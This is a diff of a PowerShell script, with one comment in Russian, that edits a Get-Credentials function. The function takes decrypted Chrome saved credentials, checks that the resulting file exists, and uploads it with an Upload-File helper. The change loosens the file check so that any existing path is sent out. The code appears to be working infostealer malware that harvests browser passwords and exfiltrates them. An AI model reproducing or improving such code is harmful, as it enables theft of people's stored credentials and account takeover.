@@ -518,17 +518,18 @@ function Get-DecryptedChromeCreds {
 function Get-Credentials {
     try {
         $chromeCreds = Get-DecryptedChromeCreds
-        Output-Log "[DEBUG] chromeCreds raw: '$chromeCreds'"
+        Output-Log "[DEBUG] chromeCreds raw: $chromeCreds"
 
+        # Удаляем кавычки (если обёрнут в них)
         $chromeCreds = $chromeCreds.Trim("'`"")
 
-        if ((Test-Path $chromeCreds) -and ($chromeCreds -like "*.csv")) {
-            Output-Log "[+] Chrome creds saved to file: $chromeCreds"
+        if (Test-Path $chromeCreds) {
+            Output-Log "[+] Chrome creds found at path: $chromeCreds"
             $upload = Upload-File $chromeCreds
             Output-Log $upload
             return $upload
         } else {
-            Output-Log "[ERROR] Chrome creds extraction returned non-path result:`n$chromeCreds"
+            Output-Log "[ERROR] Chrome creds path not found:`n$chromeCreds"
             return "[ERROR] Chrome creds extraction failed."
         }
     }
